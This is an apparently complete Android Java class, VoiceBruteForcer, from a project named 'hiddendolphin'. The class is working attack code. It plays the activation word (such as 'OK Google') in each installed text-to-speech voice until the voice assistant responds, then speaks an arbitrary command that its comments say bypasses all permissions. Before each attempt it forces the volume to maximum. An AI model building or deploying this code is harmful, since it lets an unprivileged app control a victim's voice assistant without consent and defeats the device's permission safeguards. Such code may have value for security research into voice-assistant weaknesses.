package com.paulgavrikov.hiddendolphin;

import android.content.Context;
import android.media.AudioManager;
import android.speech.tts.TextToSpeech;
import android.speech.tts.UtteranceProgressListener;
import android.speech.tts.Voice;
import android.util.Log;

import java.util.ArrayList;

/**
 * Class that can brute force an activation word to a voice assistant using an installed TTS engine.
 * Upon recognition this class allows to send a voice command to the assistant bypassing all
 * permissions.
 */
class VoiceBruteForcer {

    private TextToSpeech mTTS = null;
    private Context mContext = null;
    private ArrayList<Voice> mVoiceList = new ArrayList<>();
    private int mVoiceIndex = 0;
    private String mAction = null;
    private final static String TAG = VoiceBruteForcer.class.getSimpleName();
    private VoiceBruteForcerListener mVoiceBruteForcerListener = null;


    VoiceBruteForcer(Context context) {
        mContext = context;
        mTTS = new TextToSpeech(context, new TextToSpeech.OnInitListener() {
            @Override
            public void onInit(int status) {
                if (status != TextToSpeech.ERROR) {
                    mVoiceList.addAll(mTTS.getVoices());
                }
            }
        });
    }

    /**
     * Speaks a command with the default voice (system setting). Assumes that a voice assistant has
     * been started by the activation word.
     *
     * @param command Command to be spoken to the voice assistant.
     */
    void speakCommand(String command) {
        mTTS.setVoice(mTTS.getDefaultVoice());
        mTTS.setOnUtteranceProgressListener(null); // disable utterance listener
        mTTS.speak(command, TextToSpeech.QUEUE_FLUSH, null, "");
    }

    /**
     * Bruteforces a given activation word with all installed voices.
     *
     * @param action Action word (e.g. "OK Google")
     */
    void bruteforceAction(String action) {
        mAction = action;
        mVoiceIndex = 0;

        mTTS.setOnUtteranceProgressListener(new UtteranceProgressListener() {
            @Override
            public void onStart(String s) {

            }

            @Override
            public void onDone(String s) {
                Log.d(TAG, String.format("%s done!", s));
                nextVoice();
            }

            @Override
            public void onError(String s) {

            }
        });

        nextVoice();
    }

    /**
     * Speaks the activation word with the next available voice.
     */
    private void nextVoice() {
        if (mVoiceIndex >= mVoiceList.size()) {
            Log.w(TAG, "All voices tried but no response");
            return;
        }

        setMaxVolume(mContext);

        Voice voice = mVoiceList.get(mVoiceIndex);
        mTTS.setVoice(voice);
        if (mVoiceBruteForcerListener != null) {
            mVoiceBruteForcerListener.onStartNewVoice(voice);
        }
        mTTS.speak(mAction, TextToSpeech.QUEUE_FLUSH, null, voice.getName());
        mVoiceIndex++;
    }

    /**
     * Sets the listener. Passing null will disable the listener.
     *
     * @param voiceBruteForcerListener Listener or null
     */
    void setVoiceBruteForcerListener(VoiceBruteForcerListener voiceBruteForcerListener) {
        this.mVoiceBruteForcerListener = voiceBruteForcerListener;
    }

    void destroy() {
        mVoiceIndex = 0;
        if (mTTS != null) {
            mTTS.stop();
            mTTS.shutdown();
        }
    }

    /**
     * Forces 100% volume.
     *
     * @param context
     */
    private void setMaxVolume(Context context) {
        AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, 100, 0);
    }

    interface VoiceBruteForcerListener {

        void onStartNewVoice(Voice voice);
    }
}
